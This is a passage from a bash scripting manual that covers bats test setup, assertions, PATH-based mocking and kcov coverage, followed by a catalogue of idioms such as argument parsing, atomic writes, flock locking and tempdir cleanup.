  cp -- "$FIXTURE_DIR/dataset.csv" "$TMP/work.csv"
}

teardown() {
  rm -rf -- "$TMP"
}

@test "first test gets fresh work.csv" {
  echo 'first' >>"$TMP/work.csv"
  run wc -l "$TMP/work.csv"
  [[ "$output" == *"2 "* ]]
}

@test "second test also gets fresh work.csv" {
  # ⇒ TMP is a NEW directory; the 'first' write from the previous test is gone
  run wc -l "$TMP/work.csv"
  [[ "$output" == *"1 "* ]]
}

```

Key invariants: `FIXTURE_DIR` is built once and shared (must be exported
to be visible inside `@test` blocks); `TMP` is rebuilt per test, so
mutations in one test cannot leak to the next. `teardown` runs even when
the assertion fails, so the cleanup is reliable.

**See also**: §21.8 (bats-core), §21.10 (run/assertions), §21.11 (mocking via PATH).

## 21.10 Bats `run` and assertions

`run` is the bats primitive that turns a *command invocation* into
*observed evidence*. It executes its argument vector in the current
shell, captures stdout, stderr, and exit code, and stows them in
predictable variables so the test can assert against them. Without
`run`, a non-zero exit halts the test on the offending line; with
`run`, the exit code is data.

```bash
@test 'greet -n NAME exits 0 and prints greeting' {
  run greet -n Alice

  # raw assertions (built-in)
  [ "$status" -eq 0 ]
  [ "$output" = 'Hello, Alice!' ]
  [ "${#lines[@]}" -eq 1 ]
}
```

The four state variables `run` populates:

| Variable | Type | Contents |
|----------|------|----------|
| `$status` | integer | exit code of the invoked command |
| `$output` | string | combined stdout+stderr (one buffer) |
| `$lines[]` | array | `$output` split on `\n`, no trailing empties |
| `$stderr` | string | stderr only — *requires* `run --separate-stderr` |
| `$stderr_lines[]` | array | `$stderr` split on `\n` |

Use `run --separate-stderr` (bats-core 1.5+) when the test must
distinguish error messaging from primary output:

```bash
@test 'greet writes errors to stderr' {
  run --separate-stderr greet --no-such-flag
  [ "$status" -eq 22 ]
  [ -z "$output" ]                              # nothing on stdout
  [[ "$stderr" == *'unknown option'* ]]
}
```

### `bats-assert` for richer assertions

The bare `[ ... ]` style is portable but verbose. `bats-assert`
(loaded in `setup_file`) provides assertion helpers that produce
diagnostic output naming the actual vs expected values when they fail:

```bash
setup_file() {
  load '/usr/lib/bats/bats-support/load.bash'
  load '/usr/lib/bats/bats-assert/load.bash'
}

@test 'greet -n NAME with bats-assert' {
  run greet -n Alice
  assert_success
  assert_output 'Hello, Alice!'
}

@test 'greet -f reads each name' {
  printf 'Alice\nBob\n' > "$BATS_TEST_TMPDIR/names.txt"
  run greet -f "$BATS_TEST_TMPDIR/names.txt"
  assert_success
  assert_line --index 0 'Hello, Alice!'
  assert_line --index 1 'Hello, Bob!'
  refute_output --partial 'Charlie'
}

@test 'greet --no-such-flag fails with exit 22' {
  run greet --no-such-flag
  assert_failure 22
  assert_output --partial 'unknown option'
}
```

The most-used helpers, paired with their bare-assertion equivalents:

| `bats-assert` | Bare equivalent |
|---------------|-----------------|
| `assert_success` | `[ "$status" -eq 0 ]` |
| `assert_failure [N]` | `[ "$status" -ne 0 ]` (or `-eq N`) |
| `assert_output STR` | `[ "$output" = "STR" ]` |
| `assert_output --partial S` | `[[ "$output" == *S* ]]` |
| `assert_output --regexp RE` | `[[ "$output" =~ $RE ]]` |
| `assert_line [-n I] STR` | `[ "${lines[I]}" = "STR" ]` |
| `refute_output [...]` | inverse of `assert_output` |
| `assert_equal A B` | `[ "$A" = "$B" ]` |

### `BATS_TEST_TMPDIR` and friends

Tests that need scratch space should use the per-test temporary
directory bats provides — it is created before the test and removed
after, so no `trap` is needed:

| Variable | Lifetime |
|----------|----------|
| `BATS_TEST_TMPDIR` | per-test |
| `BATS_FILE_TMPDIR` | per-file (survives across tests in the same file) |
| `BATS_SUITE_TMPDIR` | per-suite (survives across files in the same `bats -r` run) |

### Custom assertions

Where `bats-assert` is too coarse, write a function that exits non-zero
with a useful message:

```bash
assert_json_field() {
  local -- field=$1 want=$2 got
  got=$(jq -r ".$field" <<<"$output") || return 1
  [[ $got == "$want" ]] || {
    printf 'JSON field %s: want %q, got %q\n' "$field" "$want" "$got" >&2
    return 1
  }
}

@test 'api returns ok status' {
  run curl -s https://example.invalid/api
  assert_success
  assert_json_field status ok
}
```

A failing custom assertion produces its own message on stderr, which
bats relays into the test report — exactly the same shape as the
built-in `assert_*` helpers.

**See also**: §21.8 (bats-core basics), §21.9 (setup/teardown),
§21.11 (PATH-injection mocking), Appendix L (exit codes).

## 21.11 Mocking via PATH injection

Replacing external commands for tests.

```bash
setup() {
  MOCK_DIR=$(mktemp -d)
  PATH="$MOCK_DIR:$PATH"
  cat > "$MOCK_DIR/curl" <<'EOF'
#!/bin/bash
echo '{"result": "mocked"}'
EOF
  chmod +x "$MOCK_DIR/curl"
}

teardown() {
  rm -rf -- "$MOCK_DIR"
}
```

- Prepend a tempdir to PATH.
- Drop in mock binaries.
- Mock checks arguments and produces controlled output.
- Each test can have different mocks via `setup`.
- Persistent mocks (across tests) via `setup_file`.

## 21.12 shunit2

Older bash test framework, less popular than bats but still used.

- xUnit-style: `testFunctionName` named functions.
- `assertEquals`, `assertTrue`, `assertFalse`, `assertNotNull`.
- `setUp`, `tearDown`, `oneTimeSetUp`, `oneTimeTearDown`.
- Single file: `source shunit2`.
- Use case: shell-script-only environments where installing bats is heavy.

## 21.13 Coverage with kcov

Code coverage measurement for bash.

- `kcov OUTPUT_DIR ./script.bash args` — instruments and runs.
- Outputs HTML coverage report.
- Slow on large scripts.
- Misses some bash constructs (subshells, certain expansions).
- Use case: ensuring tests touch all branches of long functions.
- Combine with bats: `kcov OUTPUT_DIR bats tests/`.

```bash
# scenario: bats + kcov + threshold gate
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit extglob nullglob

declare -r COVERAGE_DIR='build/coverage'
declare -ri THRESHOLD=80      # percent

rm -rf -- "$COVERAGE_DIR"
mkdir -p -- "$COVERAGE_DIR"

# instrument bats run; kcov writes per-suite reports
kcov \
  --include-pattern=.bash,.sh \
  --exclude-pattern=tests/ \
  "$COVERAGE_DIR" \
  bats tests/

# extract the merged percentage
percent=$(jq -r '.percent_covered' "$COVERAGE_DIR"/*/coverage.json | head -1)
percent_int=${percent%.*}

if (( percent_int < THRESHOLD )); then
  printf >&2 'coverage %s%% below threshold %d%%\n' "$percent" "$THRESHOLD"
  exit 1
fi

printf 'coverage %s%% (threshold %d%%)\n' "$percent" "$THRESHOLD"

```

`--include-pattern` restricts instrumentation to bash sources; the
`--exclude-pattern` keeps the test files themselves out of the
denominator. The `coverage.json` schema is stable; pipe through `jq` for
gate logic. CI-side: archive `$COVERAGE_DIR/index.html` as an artefact
for human inspection.

**See also**: §21.8 (bats-core), §21.9 (setup/teardown), §21.7 (CI integration).

# Part XXII — Idioms, Patterns, and Anti-Patterns

*A catalogue of patterns that appear repeatedly in well-written bash, and a catalogue of patterns that should not appear at all. This Part is essentially a cookbook for the BCS-aligned engineer.*

---

---

## 22.1 The strict-mode preamble

The opening every script must have.

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

- Shebang: `#!/bin/bash`, `#!/usr/bin/bash`, or `#!/usr/bin/env bash` (the last for portability).
- `set -e` exit on error; `-u` unset variables; `-o pipefail` pipeline status.
- `inherit_errexit` propagate `-e` into command substitutions.
- `shift_verbose` warn on shift past end.
- `extglob` enable extended globs.
- `nullglob` empty glob expands to nothing.
- BCS canonical: declare these at the very top, before any logic.

## 22.2 Self-locating script directory

Find the script's own directory regardless of how it was invoked.

```bash
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}
```

- `BASH_SOURCE[0]` is the script file (or library file when sourced).
- `realpath` resolves symlinks (BCS preferred over `readlink`).
- `--` terminates options.
- `SCRIPT_DIR` for finding sibling files (configs, libraries, data).
- `SCRIPT_NAME` for messages.

## 22.3 Argument-parsing skeleton

The canonical hand-rolled argument parser for BCS scripts. Reach for this
whenever you would otherwise sprinkle `getopts` or `getopt` into a script:
the BCS form costs the same number of lines, but supports long options,
bundled short options, equals-form (`--out=foo`), the `--` end-of-options
sentinel, and explicit per-option argument validation — none of which
`getopts` gives you.

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH="$(realpath -- "$0")"
declare -r SCRIPT_NAME="${SCRIPT_PATH##*/}"

# --- Defaults (BCS0208: integer flags, BCS0204: env-var override) -------
declare -i VERBOSE=1 DRY_RUN=0 DEBUG=0 FORCE=0
declare -- OUTPUT="${OUTPUT:-}"
declare -- MODE='normal'
declare -a FILES=()

die()   { (($# < 2)) || printf '%s: %s\n' "$SCRIPT_NAME" "${*:2}" >&2; exit "${1:-1}"; }
noarg() { (($# > 1)) || die 22 "Option ${1@Q} requires an argument"; }

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION -- example BCS-canonical argument parser.

Usage: $SCRIPT_NAME [OPTIONS] [--] FILE...

Options:
  -v, --verbose       Increase verbosity (default).
  -q, --quiet         Suppress informational output.
  -n, --dry-run       Preview without changes.
  -f, --force         Skip confirmation prompts.
  -D, --debug         Enable debug output.
  -o, --output FILE   Write output to FILE.
  -m, --mode MODE     One of: normal, fast, safe.
  -V, --version       Print version and exit.
  -h, --help          Print this help and exit.
HELP
}

main() {
  while (($#)); do case $1 in
    -v|--verbose)     VERBOSE=1 ;;
    -q|--quiet)       VERBOSE=0 ;;
    -n|--dry-run)     DRY_RUN=1 ;;
    -f|--force)       FORCE=1 ;;
    -D|--debug)       DEBUG=1 ;;
    -o|--output)      noarg "$@"; shift; OUTPUT=$1 ;;
    -o=*|--output=*)  OUTPUT=${1#*=} ;;
    -m|--mode)        noarg "$@"; shift; MODE=$1 ;;
    -m=*|--mode=*)    MODE=${1#*=} ;;
    -V|--version)     printf '%s %s\n' "$SCRIPT_NAME" "$VERSION"; exit 0 ;;
    -h|--help)        show_help; exit 0 ;;
    --)               shift; FILES+=("$@"); break ;;
    -[vqnfDomVh]?*)   set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
    -*)               die 22 "Invalid option ${1@Q}" ;;
    *)                FILES+=("$1") ;;
  esac; shift; done

  # Post-parse validation -------------------------------------------------
  ((${#FILES[@]})) || die 2 'No input files specified'
  [[ $MODE =~ ^(normal|fast|safe)$ ]] || die 22 "Invalid mode ${MODE@Q}"
  ((DRY_RUN && FORCE)) && die 22 '--force and --dry-run are mutually exclusive'

  readonly VERBOSE DRY_RUN DEBUG FORCE OUTPUT MODE
  declare -r FILES

  # ... do work ...
}

main "$@"
```

Walking through the loop top-to-bottom: `(($#))` tests positional count
arithmetically, half the cost of `[[ $# -gt 0 ]]` (BCS0801). Each option
arm is one `case` entry; long and short forms share the arm by listing
both patterns separated by `|`. Boolean toggles (`--verbose`, `--debug`)
just set their flag; argument-taking options (`--output`, `--mode`) call
`noarg "$@"` *before* shifting so the validator can inspect `$2` while it
still exists, and only then `shift; VAR=$1` consumes it (BCS0803). The
equals form has its own arm using `${1#*=}` to strip the prefix; this
keeps `--output=foo` working without a second shift.

The `--` arm hands every remaining argument verbatim to `FILES` and
breaks the loop, so a literal `-x` filename after `--` is never confused
for a flag. The bundling arm `-[vqnfDomVh]?*` matches a short option
followed by extra characters (`-vDn`, `-vno output.txt`); it splices the
input into `${1:0:2}` (`-v`) and `-${1:2}` (`-Dn`) and uses `continue`
to re-enter the loop without `shift` — the `-v` is processed on the next
iteration, then `-Dn` gets disaggregated again. The character class lists
**only** valid short options: any unlisted letter falls through to the
`-*` arm and dies with an "Invalid option" message (BCS0805). The
catch-all `*)` arm collects positional arguments into `FILES`.

After parsing, validate semantics. Required arguments
(`((${#FILES[@]}))`), value-set membership (regex on `$MODE`), and
mutual-exclusion checks belong here, not inside the case arms. Then mark
everything `readonly` so a stray downstream assignment is loud rather
than silent (BCS0205).

**Common bug: missing `shift` at loop end.**

```bash
# wrong — infinite loop on the first arg
while (($#)); do case $1 in
  -v) VERBOSE=1 ;;
esac; done

# correct — terminating `; shift; done`
while (($#)); do case $1 in
  -v) VERBOSE=1 ;;
esac; shift; done
```

The trailing `shift` is part of the idiom, not optional ornament; the
loop has no other way to advance. Cases that exit (`--help`, `--version`)
or that themselves shift (`--`, the noarg-aware arms) don't reach the
final `shift`, which is why they are written to break, exit, or balance
their own shifts.

**See also**: §15.4 for the full discussion of CLI parsing alternatives
(`getopts`, GNU `getopt`, third-party libraries) and benchmark data;
BCS0801 / BCS0803 / BCS0805 / BCS0806 in `BASH-CODING-STANDARD.md` for
the rule-level statement of each component.

## 22.4 Default-value patterns

Defaulting a variable in bash is one of those tasks where four near-identical
forms exist and the differences only matter when you are debugging a script
in production at three in the morning. Pick the form that matches what you
actually want to happen to the variable; resist the urge to swap them
mechanically.

The four forms differ on two axes: do they trigger when the variable is
*unset* only, or *unset-or-empty*? And do they assign back into the variable,
or just substitute a value at the point of use? Pick by reading both columns:

| Form | Triggers on unset | Triggers on empty | Assigns to VAR |
|------|-------------------|-------------------|----------------|
| `${VAR-default}` | yes | no | no |
| `${VAR:-default}` | yes | yes | no |
| `${VAR=default}` | yes | no | yes |
| `${VAR:=default}` | yes | yes | yes |

The colon variants treat an empty string as "needs defaulting"; the colonless
variants accept the empty string as a deliberate choice and leave it alone.
The `=` variants mutate the variable in place; the `-` variants substitute
once and discard the default. None of the four export anything to the
environment — that still requires `export VAR` or `declare -x VAR`.

```bash
# scenario: defaulting a config value that may be unset OR deliberately empty
declare -- log_level=${LOG_LEVEL:-info}    # local copy, "info" if missing/empty

# scenario: assigning a default the rest of the function can rely on
: "${CACHE_DIR:=$HOME/.cache/myapp}"        # mutates CACHE_DIR; reuses everywhere

# scenario: distinguishing "user set FLAG=" from "user didn't set FLAG"
declare -- flag=${FLAG-unset}               # "unset" only when truly unset

# scenario: BCS-canonical declaration with default at top of script (BCS0105)
declare -i VERBOSE=${VERBOSE:-1}            # respects env override; falls back
declare -- CONFIG=${CONFIG:-/etc/myapp.conf}
```

The `:` form (`: "${VAR:=default}"`) deserves a closer look. The colon command
is a no-op that consumes its arguments without doing anything, so the only
purpose of the line is the side effect of the parameter expansion: assign the
default if needed, evaluate to the final value, then discard the value. This
is the idiom for "guarantee VAR has a value before I touch it." Without the
leading `:`, `"${VAR:=default}"` would be executed as a command and bash would
try to run a program named after the variable's value.

```bash
# wrong — runs $CACHE_DIR as if it were a command
"${CACHE_DIR:=$HOME/.cache/myapp}"
# ⇒ "myapp: command not found" (or worse, runs an attacker-chosen file)

# right — `:` swallows the value, side effect remains
: "${CACHE_DIR:=$HOME/.cache/myapp}"
```

A subtler trap: `${VAR:=default}` does not work on positional parameters or
read-only variables. `${1:=default}` is a syntax error; use `set -- "${1:-default}"`
instead. And `declare -r VAR=…` creates a read-only variable that subsequent
`:=` assignments will refuse with an error under `set -e`.

**See also**: §13.3 (parameter expansion) for the full grammar of `${…}` forms;
§22.5 (lazy initialisation) for the broader pattern when defaulting requires a
function call; BCS0105 (global variables) and BCS0204 (constants) for the
declare-with-default discipline at the top of a BCS-compliant script.

## 22.5 Lazy initialisation

Compute on first use.

```bash
get_config() {
  if [[ -z ${_CONFIG_LOADED:-} ]]; then
    source "$config_file"
    _CONFIG_LOADED=1
  fi
}
```

- Use a sentinel to track first invocation.
- Compute once, reuse.
- Watch for scope: `_CONFIG_LOADED` must be global.
- Use `declare -g` if setting from inside a function.

## 22.6 Memoisation

Cache function results.

```bash
declare -A _MEMO_CACHE

memoised_compute() {
  local key=$1
  if [[ -z ${_MEMO_CACHE[$key]+set} ]]; then
    _MEMO_CACHE[$key]=$(expensive_compute "$key")
  fi
  printf '%s\n' "${_MEMO_CACHE[$key]}"
}
```

- Associative array as cache.
- Test for key existence with `[[ -z ${arr[k]+set} ]]` to distinguish "unset" from "set to empty".
- Cache invalidation strategy: TTL, manual flush, or none.

## 22.7 Iterating an associative array deterministically

Bash hashtable iteration order is unspecified. Sort for reproducibility.

```bash
for key in $(printf '%s\n' "${!by_id[@]}" | sort); do
  printf '%s = %s\n' "$key" "${by_id[$key]}"
done
```

- `printf '%s\n' "${!by_id[@]}"` — one key per line.
- `sort` with appropriate flags (`-n` for numeric, `-V` for version, default lexical).
- For large maps, the sort cost is real; cache sorted keys if iterating repeatedly.

## 22.8 Building structured output

When a bash script has to emit data for another program — a CSV ingested by a
spreadsheet, a TSV piped to `awk`, a JSON payload curled into an API — the
scripts that fail in production almost always fail at the *quoting boundary*.
A field with an embedded comma, a stray backslash, a Unicode quotation mark
in someone's name: each is a defect just waiting for the right input.

The general rule is: **emit through a tool whose authors have already solved
the quoting problem.** For TSV that's `printf`; for CSV it's a discipline of
explicit quoting; for JSON it is unconditionally `jq`.

### TSV — the easy case

Tab-separated values with no embedded tabs or newlines is the cheapest
structured format bash supports. `printf` does the right thing for free:

```bash
# scenario: emit a TSV header and rows from arrays
printf '%s\t%s\t%s\n' name email role
for ((i=0; i<${#names[@]}; i+=1)); do
  printf '%s\t%s\t%s\n' "${names[i]}" "${emails[i]}" "${roles[i]}"
done
# ⇒ name<TAB>email<TAB>role
#   alice<TAB>alice@example.com<TAB>admin
```

The only failure mode is a field containing an actual tab or newline. Strip or
escape those at the source — `${value//$'\t'/ }` for tabs.

### CSV — explicit quoting required

CSV (RFC 4180) requires fields containing commas, double-quotes, or newlines
to be wrapped in double-quotes, with internal quotes doubled. Skipping this
step is the canonical bash CSV bug.

```bash
# scenario: write a CSV row from a bash array, RFC-4180 correct
csv_field() {
  local -- value=$1
  if [[ $value == *[\",$'\n']* ]]; then
    value=${value//\"/\"\"}              # double internal quotes
    printf '"%s"' "$value"
  else
    printf '%s' "$value"
  fi
}

csv_row() {
  local -i i
  for ((i=1; i<=$#; i+=1)); do
    (( i > 1 )) && printf ','
    csv_field "${!i}"
  done
  printf '\n'
}

# Usage:
csv_row 'Alice' 'alice@example.com' 'sales, EU'
csv_row 'Bob, Jr.'  $'multi\nline'   'admin'
# ⇒ Alice,alice@example.com,"sales, EU"
#   "Bob, Jr.","multi
#   line",admin
```

### JSON — never hand-roll, use jq

Hand-rolling JSON in bash is the wrong answer to every question. Backslashes,
control characters, Unicode, and the contrast between "null" and `"null"` will
defeat any printf-based scheme eventually. Use `jq -n` and pass values through
`--arg` (string) or `--argjson` (already-JSON):

```bash
# scenario: build a JSON object from bash variables
declare -- name='O'\''Brien' email='o@example.com'
declare -i age=42

jq -nc \
  --arg name  "$name" \
  --arg email "$email" \
  --argjson age "$age" \
  '{name: $name, email: $email, age: $age}'
# ⇒ {"name":"O'Brien","email":"o@example.com","age":42}
```

For JSON arrays built from a bash array, push the whole list through `jq -R`
(raw input) and `-s` (slurp into an array):

```bash
# scenario: emit a JSON array from a bash array of strings
declare -a tags=(red 'amber/orange' 'with "quotes"')

printf '%s\n' "${tags[@]}" | jq -R . | jq -cs .
# ⇒ ["red","amber/orange","with \"quotes\""]

# scenario: nest the array inside an object
items_json=$(printf '%s\n' "${tags[@]}" | jq -R . | jq -s .)
jq -nc --argjson items "$items_json" '{count: ($items | length), items: $items}'
# ⇒ {"count":3,"items":["red","amber/orange","with \"quotes\""]}
```

The reason `--argjson` matters: `--arg age 42` would pass the *string* "42",
yielding `{"age":"42"}`. Numeric and boolean fields must use `--argjson`.

```bash
# wrong — every field becomes a string, breaking downstream consumers
jq -nc --arg active true --arg count 0 '{active: $active, count: $count}'
# ⇒ {"active":"true","count":"0"}

# right — booleans and numbers go through --argjson
jq -nc --argjson active true --argjson count 0 '{active: $active, count: $count}'
# ⇒ {"active":true,"count":0}
```

**See also**: §6.10 (`printf` formatting); §11.4 (`mapfile -t` for the inverse —
JSON-to-bash); BCS0305 (printf patterns) for the general printf-over-echo
preference; BCS0306 (`@Q` quoting) for safe shell-quoted output when the
consumer is bash itself.

## 22.9 Reading config files safely

Sourcing arbitrary files is a code-execution risk. Parse instead.

```bash
read_conf() {
  local conf_file=$1 line key value
  while IFS='=' read -r key value; do
    [[ $key == \#* || -z $key ]] && continue
    key=${key// /}
    value=${value%\"}
    value=${value#\"}
    declare -g -- "${key^^}=$value"
  done < "$conf_file"
}
```

- Strict regex-based parsing.
- Reject lines that don't match expected format.
- Whitelist allowed keys.
- Never `source` a config file you don't fully trust.

## 22.10 Atomic file write

Use this whenever a reader could observe the target file at any moment —
a config file consumed by another daemon, a state file the next run of
the same script will read, anything served by a webserver. The naive
`echo … > "$target"` truncates the target before the new content has
been written, leaving a window in which a concurrent reader sees an
empty or half-written file. Writing to a sibling tempfile and renaming
closes that window: `mv` (which calls `rename(2)`) is atomic on the same
filesystem, so the target is either the old content or the new — never
in-between.

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r SCRIPT_NAME='atomic-write-demo'

die() { (($# < 2)) || printf '%s: %s\n' "$SCRIPT_NAME" "${*:2}" >&2; exit "${1:-1}"; }

# atomic_write TARGET <<<"$content"
# Reads stdin, writes it to TARGET atomically.
atomic_write() {
  local -- target=$1 tmp
  local -- dir=${target%/*}
  [[ $dir == "$target" ]] && dir=.

  tmp=$(mktemp -- "$dir"/."${target##*/}".XXXXXX) \
    || die 1 "atomic_write: mktemp failed for ${target@Q}"

  # Cleanup if anything between here and `mv` fails.
  trap 'rm -f -- "$tmp"' RETURN

  cat >"$tmp" || die 5 "atomic_write: write failed to ${tmp@Q}"

  # Optional but recommended: durably persist before rename so a crash
  # between rename and fsync cannot resurrect a stale-content target.
  command -v sync >/dev/null && sync -- "$tmp" 2>/dev/null ||:

  # Inherit the target's mode if it already exists; otherwise mktemp's
  # 0600 default applies — adjust before mv if the target needs 0644.
  if [[ -e $target ]]; then
    chmod --reference="$target" -- "$tmp" 2>/dev/null ||:
  fi

  mv -f -- "$tmp" "$target" || die 5 "atomic_write: rename failed"
  trap - RETURN
}

# Usage:
printf 'count=%d\nmode=%s\n' 42 production | atomic_write /etc/myapp.conf
```

The mechanics turn on three details. First, the tempfile must live in
the same directory as the target; `rename(2)` is atomic only within a
single filesystem, and `/tmp` is frequently a separate mount (tmpfs). A
hidden-prefix template like `."${target##*/}".XXXXXX` keeps the partial
file out of `ls` listings while it is being written. Second, the
`trap … RETURN` removes the tempfile if any subsequent command fails
under `set -e`; without that the directory accumulates orphan
`.target.A1b2C3` files. Third, the `chmod --reference` step preserves
the target's existing permissions — without it, an atomic rewrite of a
0644 config silently downgrades to 0600 because that is `mktemp`'s
default.

**Common bug: writing to `/tmp` then `mv` across filesystems.**

```bash
# wrong — /tmp is often a different filesystem; mv falls back to copy+
# unlink, which is NOT atomic and races with concurrent readers.
tmp=$(mktemp)
echo "$payload" >"$tmp"
mv "$tmp" /etc/myapp.conf

# correct — tempfile sibling to target, single filesystem, atomic rename.
tmp=$(mktemp -- /etc/.myapp.conf.XXXXXX)
echo "$payload" >"$tmp"
mv -- "$tmp" /etc/myapp.conf
```

**See also**: §12.15 for the full discussion of atomic-write pitfalls
(cross-filesystem rename, fsync ordering, directory fsync for crash
safety); BCS1006 in `BASH-CODING-STANDARD.md` for the temporary-file
mandate.

## 22.11 Exclusive lock

Use this whenever at most one instance of a script may run at a time —
backup jobs, cache rebuilders, anything that would corrupt state if two
copies ran in parallel. The idiom opens a dedicated lockfile on a
permanent file descriptor and holds an `flock(2)` exclusive lock on it
for the lifetime of the shell. The kernel releases the lock when the
last reference to the file descriptor closes, which happens
automatically on shell exit, crash, or kill — no `trap`-based cleanup
is required for the lock itself.

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r SCRIPT_NAME='locked-job'
declare -r LOCKFILE="${TMPDIR:-/tmp}/$SCRIPT_NAME.lock"   # production: /run/lock

die() { (($# < 2)) || printf '%s: %s\n' "$SCRIPT_NAME" "${*:2}" >&2; exit "${1:-1}"; }

acquire_lock() {
  local -- lockfile=$1

  # Open FD 9 for write, creating the lockfile if missing.
  # FD numbers >= 9 are conventional for long-lived script-internal handles.
  exec 9>"$lockfile" || die 5 "Cannot open lockfile ${lockfile@Q}"

  # -n: non-blocking (fail immediately if held by another process).
  # -x: exclusive (default for write FDs, made explicit here).
  flock -n -x 9 || die 1 "$SCRIPT_NAME is already running (lock: $lockfile)"

  # Record our PID so operators inspecting the lockfile can find us.
  printf '%d\n' "$$" >&9
}

main() {
  acquire_lock "$LOCKFILE"

  # ... long-running work; lock is held throughout ...
  printf 'doing the thing\n'    # ⇒ doing the thing
  sleep 0.05                    # placeholder for real work

  # No explicit unlock needed. When this shell exits (normal, signal, or
  # crash) the kernel closes FD 9 and the lock is released automatically.
}

main "$@"
```

A few details deserve attention. The lockfile is opened for *write*
(`9>"$lockfile"`) rather than read; this guarantees the file exists
before `flock` runs, even on the very first invocation. The path lives
in `/run/lock` (a tmpfs mounted with the right semantics on every
modern Linux system) so the lockfile vanishes at boot — there is never
a stale lockfile after a crash, because the file descriptor itself is
the lock, not the file's mere existence. Using a regular path like
`/var/run/foo.pid` for both the PID and the lock is a classic mistake:
PID files require manual cleanup and stale-pid detection, while
fd-backed `flock` does neither.

`flock -n` returns non-zero immediately if the lock is held; without
`-n`, the call would block until the other instance exited, which is
sometimes what you want (e.g. cron-job serialisation) but rarely what
you want for an interactive command. Keep one or the other consistent
with the script's purpose.

**Common bug: opening the FD inside a subshell.**

```bash
# wrong — the subshell exits as soon as `flock` returns; the lock dies
# with it, so the next process happily acquires it.
(
  exec 9>"$LOCKFILE"
  flock -n 9 || exit 1
) && do_work    # lock already gone by the time do_work runs

# correct — open in the parent shell so the FD outlives the test.
exec 9>"$LOCKFILE"
flock -n 9 || die 1 'already running'
do_work        # lock held for the rest of this script
```

**See also**: §12.14 for the full discussion of advisory locking
semantics, NFS caveats, `flock` vs `fcntl` vs `lockf`, and why
`mkdir`-based locks are not a substitute. BCS0110 covers the cleanup-
trap pattern for resources that *do* need explicit teardown; the
fd-backed lock is the rare resource that does not.

## 22.12 Bounded retry with exponential backoff

Retry on transient failure with growing delay.

```bash
retry() {
  local max=$1 delay=1
  shift
  local attempt
  for ((attempt = 1; attempt <= max; attempt++)); do
    if "$@"; then return 0; fi
    if (( attempt < max )); then
      sleep "$delay"
      delay=$((delay * 2))
    fi
  done
  return 1
}
```

- Configurable max retries.
- Exponential delay (1, 2, 4, 8, …).
- Optional jitter to avoid thundering herd.
- Distinguish retryable from non-retryable errors (consider exit-code-based decision).

## 22.13 Tempdir lifecycle

Use this whenever a script needs scratch space — extracting a tarball,
staging files for atomic publish, accumulating intermediate output
across functions. Reach for `mktemp -d` plus an `EXIT` trap, never
hand-rolled `/tmp/$$`-style paths: predictable names are a security
hole (BCS1006), and an `EXIT` trap guarantees cleanup on every exit
path including signals, errors, and ordinary returns.

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r SCRIPT_NAME='tempdir-demo'
declare -- TEMP_DIR=''

die() { (($# < 2)) || printf '%s: %s\n' "$SCRIPT_NAME" "${*:2}" >&2; exit "${1:-1}"; }

cleanup() {
  local -i exitcode=${1:-$?}
  trap - SIGINT SIGTERM EXIT          # disarm to prevent recursion
  [[ -z $TEMP_DIR ]] || rm -rf -- "$TEMP_DIR"
  exit "$exitcode"
}

main() {
  # Install the trap BEFORE creating the resource. If mktemp fails,
  # cleanup runs with TEMP_DIR='' and the [[ -z ]] guard makes it a no-op.
  trap 'cleanup $?' SIGINT SIGTERM EXIT

  TEMP_DIR=$(mktemp -d -t "$SCRIPT_NAME.XXXXXX") \
    || die 1 'mktemp -d failed'

  # ... use $TEMP_DIR throughout the script ...
  printf 'header\n' >"$TEMP_DIR"/work.txt
  process_things "$TEMP_DIR"

  # No explicit `rm -rf` here. The EXIT trap handles success and failure
  # paths uniformly; sprinkling cleanup code mid-script is the bug, not
  # the feature.
}

process_things() {
  local -- workdir=$1
  # ... operate on files inside $workdir ...
  printf 'processed in %s\n' "$workdir"
}

main "$@"
```

The order of operations is load-bearing. The trap is installed *before*
`mktemp` runs, so even a failed `mktemp` triggers `cleanup` (which
no-ops because `TEMP_DIR` is still empty). The trap captures `$?` at
the call site, not inside `cleanup`, because `trap - … EXIT` clobbers
`$?` with its own exit status. Disarming the trap as the first line of
`cleanup` prevents recursion if `rm -rf` itself somehow generates a
signal. The double-dash on `rm -rf -- "$TEMP_DIR"` defends against the
near-impossible but catastrophic case where `mktemp` returns a path
beginning with `-`.

`mktemp -d -t TEMPLATE` honours `$TMPDIR` when set, falling back to
`/tmp`; on systemd-managed services this often points to a per-service
private tmpfs that vanishes when the unit stops, which is exactly what
you want. Avoid hardcoding `/tmp`.

**Common bug: cleaning up mid-script.**

```bash
# wrong — multiple cleanup sites that disagree on exit paths.
TEMP_DIR=$(mktemp -d)
do_step_one "$TEMP_DIR" || { rm -rf "$TEMP_DIR"; exit 1; }
do_step_two "$TEMP_DIR" || { rm -rf "$TEMP_DIR"; exit 1; }
do_step_three "$TEMP_DIR"          # forgot the cleanup on this path
rm -rf "$TEMP_DIR"

# correct — single trap, single cleanup site, every exit path covered.
trap 'rm -rf -- "$TEMP_DIR"' EXIT
TEMP_DIR=$(mktemp -d)
do_step_one "$TEMP_DIR"
do_step_two "$TEMP_DIR"
do_step_three "$TEMP_DIR"
```

**See also**: §12.13 for the full discussion of temp-resource
lifecycles, multi-resource cleanup composition, and why a *single*
cleanup function beats stacked traps. BCS0110 (cleanup-and-traps),
BCS0603 (trap handling), and BCS1006 (temporary-file handling) state
the rule-level requirements.

## 22.14 Mock-friendly subprocess wrapper

Wrap external commands behind a function for testability.

```bash
git_cmd() { command git "$@"; }
```

- Tests can override `git_cmd` to a mock.
- Use `command` prefix to bypass any function shadowing.
